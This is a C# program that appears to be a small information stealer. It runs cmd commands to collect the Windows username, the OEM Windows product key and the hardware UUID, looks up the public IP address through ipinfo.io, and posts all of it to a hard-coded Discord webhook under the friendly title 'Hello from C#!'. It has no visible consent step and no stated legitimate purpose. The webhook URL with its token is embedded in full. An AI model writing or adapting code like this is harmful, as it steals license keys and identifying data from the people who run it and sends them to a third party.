﻿using System;
using System.Diagnostics;
using System.Net;
using System.Net.Http;
using System.Text;
using Newtonsoft.Json.Linq;

class Program
{
    static async Task Main(string[] args)
    {
        var webhookUrl = "https://discord.com/api/webhooks/1094464012575572041/mG-IicpdGrV5Bn02VFx1deeeB6KT66UnCBuSzaL9eZB10gLEpf_TPlIbNMocAUb0aEts";
        var client = new HttpClient();

        // Get username
        var processStartInfo = new ProcessStartInfo
        {
            FileName = "cmd",
            Arguments = "/C whoami",
            RedirectStandardOutput = true,
            UseShellExecute = false
        };
        var process = Process.Start(processStartInfo);
        var output = process.StandardOutput.ReadToEnd();
        var username = output.Trim();

        // Get IP address
        var ipAddress = new WebClient().DownloadString("http://ipinfo.io/ip").Trim();

        // Get Windows product key
        processStartInfo = new ProcessStartInfo
        {
            FileName = "cmd",
            Arguments = "/C wmic path softwarelicensingservice get OA3xOriginalProductKey",
            RedirectStandardOutput = true,
            UseShellExecute = false
        };
        process = Process.Start(processStartInfo);
        output = process.StandardOutput.ReadToEnd();
        var key = output.Split('\n')[1].Trim();

        // Get HWID
        processStartInfo = new ProcessStartInfo
        {
            FileName = "cmd",
            Arguments = "/C wmic csproduct get uuid",
            RedirectStandardOutput = true,
            UseShellExecute = false
        };
        process = Process.Start(processStartInfo);
        output = process.StandardOutput.ReadToEnd();
        var hwid = output.Split('\n')[1].Trim();

        var payload = new JObject
        {
            {"username", "Honesty"},
            {"avatar_url", "https://cdn.discordapp.com/attachments/1094476147888234506/1094476267396550807/3_-_a_letter_A_with_lines_with_a_smoke_backgroun.png"},
            {"embeds", new JArray
                {
                    new JObject
                    {
                        {"title", "Hello from C#!"},
                        {"fields", new JArray
                            {
                                new JObject
                                {
                                    {"name", "Username"},
                                    {"value", $"```{username}```"},
                                    {"inline", true}
                                },
                                new JObject
                                {
                                    {"name", "IP Address"},
                                    {"value", $"```{ipAddress}```"},
                                    {"inline", true}
                                },
                                new JObject
                                {
                                    {"name", "Windows Product Key"},
                                    {"value", $"```{key}```"},
                                    {"inline", true}
                                },
                                new JObject
                                {
                                    {"name", "HWID"},
                                    {"value", $"```{hwid}```"},
                                    {"inline", true}
                                }
                            }
                        },
                        {"color", 15844367}
                    }
                }
            }
        };

        var content = new StringContent(payload.ToString(), Encoding.UTF8, "application/json");
        var response = await client.PostAsync(webhookUrl, content);

        response.EnsureSuccessStatusCode();
    }
}
